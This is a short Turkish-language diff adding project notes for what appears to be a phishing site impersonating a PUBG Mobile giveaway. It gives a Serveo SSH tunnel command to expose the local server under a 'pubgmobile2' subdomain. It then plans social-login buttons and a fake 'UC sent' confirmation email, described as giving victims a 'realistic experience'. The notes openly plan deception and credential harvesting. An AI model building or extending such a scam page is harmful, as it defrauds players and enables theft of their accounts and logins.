@@ -1,0 +1,12 @@
+Serveo ile yerel sunucunuzu internete açmak için şu komutu çalıştırın:ssh -R pubgmobile2:80:localhost:5000 serveo.netServeo, size bir URL verecek. Örnek çıktı:Forwarding HTTP traffic from http://pubgmobile2.serveo.net
+
+ilerde eklenebilir olan şeyler: Google giriş yap, Facebook ile giriş yap, Twitter ile giriş yap, ssl ekleme
+
+bir diğer eklenebilir olanlr:
+
+E-posta Gönderme Özelliği
+Açıklama: Kullanıcıya "UC gönderildi" gibi sahte bir onay e-postası gönderilebilir.
+Nasıl Yapılır: Flask-Mail veya smtplib ile e-posta entegrasyonu eklenebilir.
+Fayda: Kullanıcıya gerçekçi bir deneyim sağlar
+
+
